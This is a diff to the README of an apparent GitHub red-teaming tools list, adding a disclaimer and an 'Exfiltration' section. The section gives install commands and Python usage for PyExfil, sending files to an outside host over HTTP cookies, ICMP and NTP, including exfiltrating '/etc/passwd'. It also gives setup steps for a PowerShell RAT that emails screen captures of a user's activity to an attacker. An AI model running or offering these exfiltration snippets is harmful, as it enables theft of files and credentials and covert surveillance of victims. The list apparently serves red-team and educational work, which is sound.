@@ -2,6 +2,8 @@
 
 *This github repository contains a collection of tools and resources that can be useful for red teaming activities. The tools can help red teamers to plan and conduct their operations. Some of the tools may be specifically designed for red teaming, while others are more general-purpose and can be adapted for use in a red teaming context.*
 
+**Note:** *The materials in this repository are for informational and educational purposes only. They are not intended for use in any illegal activities.*
+
 ---------------
 # Table of Contents
 
@@ -452,3 +454,70 @@ Command and Control
 	
 	![image](https://user-images.githubusercontent.com/100603074/206025215-9c7093e5-b45a-4755-81e6-9e2a52a1f455.png)
 
+Exfiltration
+====================
+
+* [PyExfil](https://github.com/ytisf/PyExfil)
+
+	"An Alpha-Alpha stage package, not yet tested (and will appreciate any feedbacks and commits) designed to show several techniques of data exfiltration is real-world scenarios."
+	
+	**Install:** `git clone https://www.github.com/ytisf/PyExfil;cd PyExfil;pip install -r requirements.txt;pip install py2exe;pip setup.py install`
+	
+	**Usage:** (Full Usage [here](https://github.com/ytisf/PyExfil/blob/master/USAGE.md))
+	
+	### HTTP Cookies
+	
+	```python
+	from pyexfil.network.HTTP_Cookies.http_exfiltration import send_file, listen
+
+	# For Client (exfil)
+	send_file(addr='http://www.morirt.com', file_path=FILE_TO_EXFIL)
+
+	# For Server (collecting)
+	listen(local_addr='127.0.0.1', local_port=80)
+	```
+	
+	### ICMP Echo 8
+	
+	```
+	from pyexfil.network.ICMP.icmp_exfiltration import send_file, init_listener
+
+	# For Client (exfil)
+	ip_addr = "127.0.0.1"
+	send_file(ip_addr, src_ip_addr="127.0.0.1", file_path="", max_packetsize=512, SLEEP=0.1)
+
+	# For Server (collecting)
+	init_listener(ip_addr, saving_location="/tmp/")
+	```
+	
+	### NTP Request
+
+	```
+	from pyexfil.network.NTP.ntp_exfil import exfiltrate, ntp_listen, NTP_UDP_PORT
+
+	# For Client (exfil)
+	ip_addr = "127.0.0.1"
+	exfiltrate("/etc/passwd", ip_addr, time_delay=0.1)
+
+	# For Server (collecting)
+	ntp_listener(ip="0.0.0.0", port=NTP_UDP_PORT)
+	```
+	
+	![image](https://user-images.githubusercontent.com/100603074/206573575-e90384c4-4a39-4f3c-96ec-face1f191808.png)
+
+* [Powershell RAT](https://github.com/Viralmaniar/Powershell-RAT)
+
+	Python based backdoor that uses Gmail to exfiltrate data as an e-mail attachment. It tracks the user activity using screen capture and sends the information to an attacker as an e-mail attachment.
+	
+	**Install:** `git clone https://github.com/Viralmaniar/Powershell-RAT`
+	
+	**Usage:** (Full Usage [here](https://github.com/Viralmaniar/Powershell-RAT/blob/master/README.md))
+	
+	### Setup
+	
+	- Throwaway Gmail address
+	- Enable "Allow less secure apps" by going to https://myaccount.google.com/lesssecureapps
+	- Modify the `$username` & `$password` variables for your account in the Mail.ps1 Powershell file
+	- Modify `$msg.From` & `$msg.To.Add` with throwaway gmail address
+	
+	![image](https://user-images.githubusercontent.com/100603074/206573667-7dec0942-f9ce-4946-871f-24e4521b6411.png)
